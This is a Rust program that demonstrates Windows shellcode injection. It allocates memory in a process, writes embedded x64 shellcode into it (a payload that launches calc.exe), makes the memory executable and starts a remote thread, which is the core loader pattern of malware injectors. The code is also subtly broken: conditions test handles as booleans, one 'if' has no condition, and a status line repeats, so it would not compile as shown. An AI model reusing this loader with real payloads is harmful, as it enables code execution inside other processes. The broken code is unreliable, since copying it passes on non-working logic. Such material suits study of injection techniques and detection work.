#![allow(unused_imports)]
use windows::{
    Win32::{
        System::{
            Memory::{VirtualAllocEx, VirtualProtectEx, VirtualFree, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
            Diagnostics::Debug::WriteProcessMemory, 
            Threading::{CreateRemoteThreadEx, OpenProcess, WaitForSingleObject, PROCESS_ALL_ACCESS, INFINITE},
        },
        Foundation::CloseHandle,
    },
};
use std::{ptr::{self, null_mut, null}, process, mem};

fn main() {

    let shellcode: &[u8] = &[
        0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x42, 0x60, 0x48, 0x8b, 0x70, 0x18, 0x48, 0x8b, 0x76, 0x20,
        0x4c, 0x8b, 0x0e, 0x4d, 0x8b, 0x09, 0x4d, 0x8b, 0x49, 0x20, 0xeb, 0x63, 0x41, 0x8b, 0x49, 0x3c,
        0x4d, 0x31, 0xff, 0x41, 0xb7, 0x88, 0x4d, 0x01, 0xcf, 0x49, 0x01, 0xcf, 0x45, 0x8b, 0x3f, 0x4d,
        0x01, 0xcf, 0x41, 0x8b, 0x4f, 0x18, 0x45, 0x8b, 0x77, 0x20, 0x4d, 0x01, 0xce, 0xe3, 0x3f, 0xff,
        0xc9, 0x48, 0x31, 0xf6, 0x41, 0x8b, 0x34, 0x8e, 0x4c, 0x01, 0xce, 0x48, 0x31, 0xc0, 0x48, 0x31,
        0xd2, 0xfc, 0xac, 0x84, 0xc0, 0x74, 0x07, 0xc1, 0xca, 0x0d, 0x01, 0xc2, 0xeb, 0xf4, 0x44, 0x39,
        0xc2, 0x75, 0xda, 0x45, 0x8b, 0x57, 0x24, 0x4d, 0x01, 0xca, 0x41, 0x0f, 0xb7, 0x0c, 0x4a, 0x45,
        0x8b, 0x5f, 0x1c, 0x4d, 0x01, 0xcb, 0x41, 0x8b, 0x04, 0x8b, 0x4c, 0x01, 0xc8, 0xc3, 0xc3, 0x41,
        0xb8, 0x98, 0xfe, 0x8a, 0x0e, 0xe8, 0x92, 0xff, 0xff, 0xff, 0x48, 0x31, 0xc9, 0x51, 0x48, 0xb9,
        0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x51, 0x48, 0x8d, 0x0c, 0x24, 0x48, 0x31, 0xd2,
        0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x28, 0xff, 0xd0,
    ];

    let pid = process::id();

    unsafe {
        println!("[i] Trying to open a Handle for the Process {pid}");
        match OpenProcess(PROCESS_ALL_ACCESS, false, pid) {
            Ok(hprocess) => 'p: {
                let haddr = VirtualAllocEx(
                    hprocess,
                    Some(null_mut()),
                    shellcode.len(),
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_READWRITE,
                );

                if haddr.is_null() {
                    eprintln!("[!] Failed to Allocate Memory in Target Process.");
                    let _ = CloseHandle(hprocess);
                    process::exit(-1)
                }

                println!("[i] Writing to memory at address {:p}", haddr);
                WriteProcessMemory(
                    hprocess,
                    haddr, 
                    shellcode.as_ptr() as _,
                    shellcode.len(),
                    None,).unwrap_or_else(|e| {
                        eprintln!("[!] WriteProcessMemory Failed With Error: {}", e);
                        let _ = CloseHandle(hprocess);
                        process::exit(-1);
                    }
                );

                let mut oldprotect: PAGE_PROTECTION_FLAGS = PAGE_PROTECTION_FLAGS(0);
                VirtualProtectEx(
                    hprocess,
                    haddr,
                    shellcode.len(),
                    PAGE_EXECUTE_READWRITE,
                    &mut oldprotect,).unwrap_or_else(|e| {
                    eprintln!("[!] VirtualProtectEx Failed With Error: {}", e);
                    let _ = CloseHandle(hprocess);
                    process::exit(-1);
                });
                
                println!("[+] Creating a Remote Thread");
                let hthread = CreateRemoteThreadEx(
                    hprocess,
                    Some(null()),
                    0,
                    Some(std::mem::transmute(haddr)),
                    Some(null()),
                    0,
                    None,
                    Some(null_mut()),).unwrap_or_else(|e| {
                        eprintln!("[!] CreateRemoteThreadEx Failed With Error: {}", e);
                        let _ = CloseHandle(hprocess);
                        process::exit(-1);
                    }
                );

                println!("[+] Executed!");

                WaitForSingleObject(hthread, INFINITE);

                if hthread {
                    let _ = CloseHandle(hthread);
                    println!("[i] Closed thread handle {:p}", hthread);
                }

                if hprocess {
                    let _ = CloseHandle(hprocess);
                    println!("[i] Closed process handle {:p}", hprocess);
                }
                
                if {
                    let _ = VirtualFree(haddr, 0, MEM_RELEASE);
                    println!("[i] Memory released");
                }

                println!("[+] Executed!");
                break 'p;
            }
            Err(pid) => {
                eprintln!("[!] Error Getting Process Identifier {pid}");
            }
        }
    }
}